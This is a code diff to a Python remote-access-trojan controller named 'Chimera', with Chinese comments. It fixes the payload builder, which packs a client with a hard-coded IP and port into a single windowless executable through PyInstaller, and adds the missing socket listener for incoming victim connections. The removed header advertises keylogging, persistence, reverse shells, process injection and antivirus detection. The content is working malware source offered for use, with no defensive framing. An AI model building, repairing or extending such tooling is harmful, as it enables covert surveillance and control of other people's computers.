@@ -1,8 +1,4 @@
-# ChimeraSuper.py - 三大远控框架合成版（全功能桌面主控端）
-# 功能清单：
-# 系统管理：终端、进程、窗口、远程桌面、文件、语音、视频、服务、注册表、剪贴板、键盘记录、持久化
-# 高级渗透：反向Shell（交互式）、内存加载PE、进程注入与迁移、EDR/AV检测
-# 隐蔽通信：TCP直连模式
+# xxHDSx.py - 三大远控框架合成版（全功能桌面主控端与完整修复版）
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
@@ -307,7 +303,7 @@ if __name__ == "__main__":
 class ChimeraSuper:
     def __init__(self, root):
         self.root = root
-        root.title("🧬 Chimera 超级合成主控端（完整版）")
+        root.title("🧬 Chimera 超级合成主控端（完整修复版）")
         root.geometry("1000x750")
         self.clients = {}
         self.client_info = {}
@@ -471,7 +467,7 @@ class ChimeraSuper:
         self.status_bar.config(text=msg)
         self.root.update()
 
-    # ---- 客户端编译打包逻辑 ----
+    # ---- 修复后的客户端编译打包逻辑（内置 PyInstaller API，防 9009 报错） ----
     def build_client(self):
         ip = self.ip_entry.get()
         port = self.port_entry.get()
@@ -481,18 +477,12 @@ class ChimeraSuper:
         try: port = int(port)
         except: messagebox.showerror("错误", "端口必须为数字"); return
         
-        # 1. 写入客户端代码文件
         code = CLIENT_TCP_TEMPLATE % (ip, port)
-        with open("client.py", "w", encoding="utf-8") as f: 
-            f.write(code)
-            
-        self.log("正在打包 client.exe ...")
+        with open("client.py", "w", encoding="utf-8") as f: f.write(code)
+        self.log("正在通过内置接口打包 client.exe ...")
         
-        # 2. 改用 PyInstaller 库内部接口直接调用，避免 9009 环境变量错误
         try:
             import PyInstaller.__main__
-            
-            # 执行打包参数：单文件、无黑窗口、命名为 client
             PyInstaller.__main__.run([
                 'client.py',
                 '--onefile',
@@ -500,8 +490,6 @@ class ChimeraSuper:
                 '--name',
                 'client'
             ])
-            
-            # 3. 检查生成结果并自动移动到同级目录
             if os.path.exists("dist/client.exe"):
                 if os.path.exists("client.exe"):
                     os.remove("client.exe")
@@ -509,9 +497,24 @@ class ChimeraSuper:
                 self.log("client.exe 生成成功！")
                 messagebox.showinfo("成功", "client.exe 已在当前目录下生成")
             else:
-                messagebox.showerror("失败", "打包未生成目标文件，请确认已安装 pyinstaller")
+                messagebox.showerror("失败", "打包未生成目标文件")
         except Exception as e:
             messagebox.showerror("错误", f"打包出错: {e}")
+
+    # ---- 补全的监听启动逻辑（修复 start_listen 缺失报错） ----
+    def start_listen(self):
+        if self.running: return
+        try:
+            port = int(self.port_entry.get())
+            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server.bind(("0.0.0.0", port))
+            self.server.listen(5)
+            self.running = True
+            self.status_label.config(text="● 监听中", fg="green")
+            self.log(f"服务已启动，正在监听端口 {port}")
+            threading.Thread(target=self.accept_clients, daemon=True).start()
+        except Exception as e:
+            messagebox.showerror("错误", str(e))
 
     def stop_listen(self):
         self.running = False
@@ -571,7 +574,6 @@ class ChimeraSuper:
             self.root.after(0, self.refresh_clients)
             return None
 
-    # ---- 各项控制动作实现 ----
     def send_cmd(self):
         cmd = self.cmd_entry.get().strip()
         if not cmd: return
